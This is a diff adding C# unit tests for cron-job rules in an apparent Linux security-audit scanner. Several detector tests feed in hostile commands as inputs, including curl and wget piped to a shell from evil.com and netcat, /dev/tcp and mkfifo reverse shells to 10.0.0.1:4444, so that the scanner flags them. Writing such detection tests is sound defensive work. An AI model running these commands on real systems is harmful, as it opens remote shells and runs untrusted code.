@@ -2139,4 +2139,319 @@ public class RuleTests
         Assert.False(new AuditdActiveRule().Evaluate(data).Passed);
         Assert.False(new LogRotationConfiguredRule().Evaluate(data).Passed);
     }
+
+    // =====================================================================
+    // Cron Job Rules
+    // =====================================================================
+
+    [Fact]
+    public void SuspiciousCronEntryRule_BenCommand_Passes()
+    {
+        var rule = new SuspiciousCronEntryRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "0 5 * * *", Command = "/usr/bin/backup.sh", RunAsUser = "root" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+    }
+
+    [Theory]
+    [InlineData("/tmp/reverse.sh")]
+    [InlineData("curl http://evil.com | bash")]
+    [InlineData("wget -O - http://evil.com | sh")]
+    [InlineData("nc -e /bin/bash 10.0.0.1 4444")]
+    [InlineData("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")]
+    [InlineData("python -c 'import pty; pty.spawn(\"/bin/bash\")'")]
+    [InlineData("perl -e 'use Socket;'")]
+    [InlineData("echo d2hvYW1p | python -c 'import os; os.system(\"id\")'")]
+    [InlineData("mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f")]
+    public void SuspiciousCronEntryRule_SuspiciousCommand_Fails(string command)
+    {
+        var rule = new SuspiciousCronEntryRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = command, RunAsUser = "root" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.False(result.Passed);
+        Assert.Equal(Severity.High, result.Severity);
+    }
+
+    [Fact]
+    public void WorldWritableCronScriptRule_Safe_Passes()
+    {
+        var rule = new WorldWritableCronScriptRule();
+        var data = new ScanData
+        {
+            CronJobs = new[]
+            {
+                new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = "755", ScriptOwner = "root", ScriptGroup = "root" }
+            }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+    }
+
+    [Fact]
+    public void WorldWritableCronScriptRule_WorldWritable_Fails()
+    {
+        var rule = new WorldWritableCronScriptRule();
+        var data = new ScanData
+        {
+            CronJobs = new[]
+            {
+                new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = "777", ScriptOwner = "root", ScriptGroup = "root" }
+            }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.False(result.Passed);
+        Assert.Equal(Severity.High, result.Severity);
+    }
+
+    [Fact]
+    public void RootCronForNonRootUserRule_SystemJob_Passes()
+    {
+        var rule = new RootCronForNonRootUserRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "0 5 * * *", Command = "/usr/bin/apt-get update", RunAsUser = "root" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+    }
+
+    [Fact]
+    public void RootCronForNonRootUserRule_UserHomePath_Fails()
+    {
+        var rule = new RootCronForNonRootUserRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.d/mycron", Schedule = "* * * * *", Command = "/home/alice/script.sh", RunAsUser = "root" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.False(result.Passed);
+        Assert.Equal(Severity.Medium, result.Severity);
+    }
+
+    [Fact]
+    public void RootCronForNonRootUserRule_UserCrontab_Ignored()
+    {
+        var rule = new RootCronForNonRootUserRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/var/spool/cron/crontabs/alice", Schedule = "* * * * *", Command = "/home/alice/script.sh", RunAsUser = null } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+    }
+
+    [Fact]
+    public void SuspiciousCronEntryRule_MultipleSuspicious_AllReported()
+    {
+        var rule = new SuspiciousCronEntryRule();
+        var data = new ScanData
+        {
+            CronJobs = new[]
+            {
+                new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "/tmp/reverse.sh", RunAsUser = "root" },
+                new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "curl http://evil.com | bash", RunAsUser = "root" }
+            }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.False(result.Passed);
+        Assert.Contains("2 suspicious entries", result.Target);
+    }
+
+    [Fact]
+    public void SuspiciousCronEntryRule_WordBoundary_NetcatLogs_DoesNotMatch()
+    {
+        var rule = new SuspiciousCronEntryRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "/opt/netcat_logs/clean.sh", RunAsUser = "root" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+    }
+
+    [Fact]
+    public void SuspiciousCronEntryRule_WordBoundary_PipeNc_DoesMatch()
+    {
+        var rule = new SuspiciousCronEntryRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "echo data |nc 10.0.0.1 4444", RunAsUser = "root" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.False(result.Passed);
+    }
+
+    [Fact]
+    public void SuspiciousCronEntryRule_NoCronData_NotApplicable()
+    {
+        var rule = new SuspiciousCronEntryRule();
+        var data = new ScanData { CronJobs = Array.Empty<CronJobEntry>(), Capabilities = Array.Empty<DataSourceCapability>() };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+        Assert.Equal(RuleStatus.NotApplicable, result.Status);
+    }
+
+    [Fact]
+    public void WorldWritableCronScriptRule_NullPermissions_Passes()
+    {
+        var rule = new WorldWritableCronScriptRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = null } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+    }
+
+    [Fact]
+    public void WorldWritableCronScriptRule_NonNumericPermissions_Passes()
+    {
+        var rule = new WorldWritableCronScriptRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = "????" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+    }
+
+    [Fact]
+    public void WorldWritableCronScriptRule_SetuidMode_Critical()
+    {
+        var rule = new WorldWritableCronScriptRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = "4755", ScriptOwner = "root", ScriptGroup = "root" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.False(result.Passed);
+        Assert.Equal(Severity.Critical, result.Severity);
+    }
+
+    [Fact]
+    public void WorldWritableCronScriptRule_NoCronData_NotApplicable()
+    {
+        var rule = new WorldWritableCronScriptRule();
+        var data = new ScanData { CronJobs = Array.Empty<CronJobEntry>(), Capabilities = Array.Empty<DataSourceCapability>() };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+        Assert.Equal(RuleStatus.NotApplicable, result.Status);
+    }
+
+    [Fact]
+    public void RootCronForNonRootUserRule_TildeUser_Fails()
+    {
+        var rule = new RootCronForNonRootUserRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "~alice/script.sh", RunAsUser = "root" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.False(result.Passed);
+    }
+
+    [Fact]
+    public void RootCronForNonRootUserRule_HomeRoot_NowCaught()
+    {
+        var rule = new RootCronForNonRootUserRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "/home/root/malicious.sh", RunAsUser = "root" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.False(result.Passed);
+    }
+
+    [Fact]
+    public void RootCronForNonRootUserRule_NonRootRunAsUser_Passes()
+    {
+        var rule = new RootCronForNonRootUserRule();
+        var data = new ScanData
+        {
+            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.d/mycron", Schedule = "* * * * *", Command = "/home/alice/script.sh", RunAsUser = "alice" } }
+        };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+    }
+
+    [Fact]
+    public void RootCronForNonRootUserRule_NoCronData_NotApplicable()
+    {
+        var rule = new RootCronForNonRootUserRule();
+        var data = new ScanData { CronJobs = Array.Empty<CronJobEntry>(), Capabilities = Array.Empty<DataSourceCapability>() };
+
+        var result = rule.Evaluate(data);
+
+        Assert.True(result.Passed);
+        Assert.Equal(RuleStatus.NotApplicable, result.Status);
+    }
+
+    [Fact]
+    public void CronJobRules_MissingData_Passes()
+    {
+        var data = new ScanData { CronJobs = Array.Empty<CronJobEntry>() };
+
+        Assert.True(new SuspiciousCronEntryRule().Evaluate(data).Passed);
+        Assert.True(new WorldWritableCronScriptRule().Evaluate(data).Passed);
+        Assert.True(new RootCronForNonRootUserRule().Evaluate(data).Passed);
+    }
+
+    [Theory]
+    [InlineData(typeof(SuspiciousCronEntryRule), "CIS 6.1")]
+    [InlineData(typeof(WorldWritableCronScriptRule), "CIS 6.1")]
+    [InlineData(typeof(RootCronForNonRootUserRule), "CIS 6.2")]
+    public void CronJobRules_HaveCisMappings(Type ruleType, string expectedControlId)
+    {
+        var rule = (IRule)Activator.CreateInstance(ruleType)!;
+
+        Assert.NotEmpty(rule.CisMappings);
+        Assert.Contains(rule.CisMappings, m => m.ControlId == expectedControlId);
+        Assert.All(rule.CisMappings, m =>
+        {
+            Assert.False(string.IsNullOrWhiteSpace(m.ControlName));
+            Assert.False(string.IsNullOrWhiteSpace(m.WhyItMatters));
+        });
+    }
 }
